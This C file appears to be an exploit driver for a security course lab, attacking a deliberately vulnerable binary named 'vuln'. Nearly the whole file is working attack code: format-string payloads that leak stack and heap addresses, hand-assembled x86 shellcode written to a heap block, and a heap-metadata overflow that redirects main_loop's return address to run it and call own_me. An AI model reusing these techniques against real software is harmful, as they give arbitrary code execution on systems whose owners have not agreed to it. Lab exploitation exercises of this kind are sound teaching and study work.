#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>

#define MAX_GRP 100

/******************************************************************************
   Unless you are interested in the details of how this program communicates
   with a subprocess, you can skip all of the code below and skip directly to
   the main function below. 
*******************************************************************************/

#define err_abort(x) do { \
      if (!(x)) {\
         fprintf(stderr, "Fatal error: %s:%d: ", __FILE__, __LINE__);   \
         perror(""); \
         exit(1);\
      }\
   } while (0)

char buf[1<<20];
unsigned end;
int from_child, to_child;

void print_escaped(FILE *fp, const char* buf, unsigned len) {
   int i;
   for (i=0; i < len; i++) {
      if (isprint(buf[i]))
         fputc(buf[i], stderr);
      else fprintf(stderr, "\\x%02hhx", buf[i]);
   }
}

void put_bin_at(char b[], unsigned len, unsigned pos) {
   assert(pos <= end);
   if (pos+len > end)
      end = pos+len;
   assert(end < sizeof(buf));
   memcpy(&buf[pos], b, len);
}

void put_bin(char b[], unsigned len) {
   put_bin_at(b, len, end);
}

void put_formatted(const char* fmt, ...) {
   va_list argp;
   char tbuf[10000];
   va_start (argp, fmt);
   vsnprintf(tbuf, sizeof(tbuf), fmt, argp);
   put_bin(tbuf, strlen(tbuf));
}

void put_str(const char* s) {
   put_formatted("%s", s);
}

static
void send() {
   err_abort(write(to_child, buf, end) == end);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   fprintf(stderr, "driver: Sent:'");
   print_escaped(stderr, buf, end);
   fprintf(stderr, "'\n");
   end = 0;
}

char outbuf[1<<20];
int get_formatted(const char* fmt, ...) {
   va_list argp;
   va_start(argp, fmt);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   int nread=0;
   err_abort((nread = read(from_child, outbuf, sizeof(outbuf)-1)) >=0);
   outbuf[nread] = '\0';
   fprintf(stderr, "driver: Received '%s'\n", outbuf);
   return vsscanf(outbuf, fmt, argp);
}

int pid;
void create_subproc(const char* exec, char* argv[]) {
   int pipefd_out[2];
   int pipefd_in[2];
   err_abort(pipe(pipefd_in) >= 0);
   err_abort(pipe(pipefd_out) >= 0);
   if ((pid = fork()) == 0) { // Child process
      err_abort(dup2(pipefd_in[0], 0) >= 0);
      close(pipefd_in[1]);
      close(pipefd_out[0]);
      err_abort(dup2(pipefd_out[1], 1) >= 0);
      err_abort(execve(exec, argv, NULL) >= 0);
   }
   else { // Parent
      close(pipefd_in[0]);
      to_child = pipefd_in[1];
      from_child = pipefd_out[0];
      close(pipefd_out[1]);
   }
}

/* Shows an example session with subprocess. Change it as you see fit, */

#define STRINGIFY2(X) #X
#define STRINGIFY(X) STRINGIFY2(X)

int main(int argc, char* argv[]) {
   unsigned seed;

   char *nargv[3];
   nargv[0] = "vuln";
   nargv[1] = STRINGIFY(GRP);
   nargv[2] = NULL;
   create_subproc("./vuln", nargv);

   fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
           "vuln, go ahead and do that now. Press 'enter' when you are ready\n"
           "to continue with the exploit\n");

   getchar();

   // Values needed for attack
   void *mainloop_bp = (void*) 0xbf8c2e18; // saved ebp for main_loop
   void *mainloop_ra = (void*) 0x804b652; // main_loop's return address
   void *ownme_addr = (void*) 0x804b1dd; // address of own_me
   void *mainloop_ra_loc = (void*) 0xbf8c2dec; // location where RA for main_loop saved

   // Relative distances between objects (preserved across multiple runs)
   unsigned mainloop_bp_ra_diff = mainloop_bp - mainloop_ra_loc;
   unsigned mainloop_ownme_diff = ownme_addr - mainloop_ra;

   // 631 is the offset for the canary; 634 the saved bp; 635 the return address.
   // For this attack we only need the saved bp and ra.
   put_str("e %634$x %635$x\n");
   send();

   // Get current value for saved BP
   unsigned cur_mainloop_bp, cur_mainloop_ra;
   get_formatted("%x%x", &cur_mainloop_bp, &cur_mainloop_ra);
   fprintf(stderr, "driver: Extracted ra=%x, bp=%x\n", cur_mainloop_ra,
           cur_mainloop_bp);

   // Use saved BP to compute location of RA for main_loop
   unsigned cur_mainloop_ra_loc = cur_mainloop_bp - mainloop_bp_ra_diff;
   fprintf(stderr, "driver: New ra location=%x\n", cur_mainloop_ra_loc);

   // Use RA to compute location of ownme and generate exploit code.
   char code_template[] =
      "\xB8\x00\x00\x00\x00"  /* mov $<ownme_addr>, %eax */
      "\xFF\xD0"              /* call *%eax */
      "\x31\xC0"              /* xor %eax, %eax (sets return value) */
      "\x68\x00\x00\x00\x00"  /* push $<cur_main_ra> */
      "\xC3"                  /* ret */
   ;

   unsigned cur_ownme_addr = cur_mainloop_ra + mainloop_ownme_diff;
   
   memcpy((char*)code_template + 1, &cur_ownme_addr, sizeof(unsigned));
   memcpy((char*)code_template + 10, &cur_mainloop_ra, sizeof(unsigned));
   
   fprintf(stderr, "driver: Code generated. Ownme addr=%x\n", cur_ownme_addr);
   
   // Write exploit code to a heap block using the p command
   put_str("p ");
   put_bin(code_template, 16);
   put_str("\n");
   send();

   // Read address of block with exploit code (623 offset to pass in main_loop)
   put_str("e %623$x\n");
   send();

   unsigned code_addr;
   get_formatted("%x", &code_addr);
   fprintf(stderr, "driver: address of exploit block=%x\n", code_addr);

   // Allocate another block to hold the new return address for main_loop
   // and read its address
   put_str("p xyz\n");
   send();

   put_str("e %623$x\n");
   send();

   unsigned ra_block_addr;
   get_formatted("%x", &ra_block_addr);
   fprintf(stderr, "driver: address of ra block=%x\n", ra_block_addr);

   // Construct payload for overflow
   unsigned blocksz = code_addr - ra_block_addr;
   unsigned payloadsz = blocksz - 3 * sizeof(int);
   unsigned explsz = payloadsz + blocksz;
   
   void** expl = (void**)malloc(explsz);
   memset((void*)expl, '\0', explsz); // ensures ra_block->in_use == 0

   expl[blocksz/sizeof(void*)] = (void*)code_addr;                      // ra_block->prev = code_addr
   expl[blocksz/sizeof(void*) + 1] = (void*)(cur_mainloop_ra_loc - 12); // ra_block->next = ML_RA - 12

   // Execute heap overflow
   put_str("p ");
   put_bin((void*)expl, explsz);
   put_str("\n");
   send();

   // Call user command to satisfy requirements of program
   put_str("u abc\n");
   send();

   // Login, then quit to trigger call to ownme
   put_str("l\n");
   send();
   
   put_str("q\n");
   send();

   usleep(100000);

   kill(pid, SIGINT);
   int status;
   wait(&status);

   if (WIFEXITED(status)) {
      fprintf(stderr, "vuln exited, status=%d\n", WEXITSTATUS(status));
   } 
   else if (WIFSIGNALED(status)) {
      printf("vuln killed by signal %d\n", WTERMSIG(status));
   } 
   else if (WIFSTOPPED(status)) {
      printf("vuln stopped by signal %d\n", WSTOPSIG(status));
   } 
   else if (WIFCONTINUED(status)) {
      printf("vuln continued\n");
   }

}
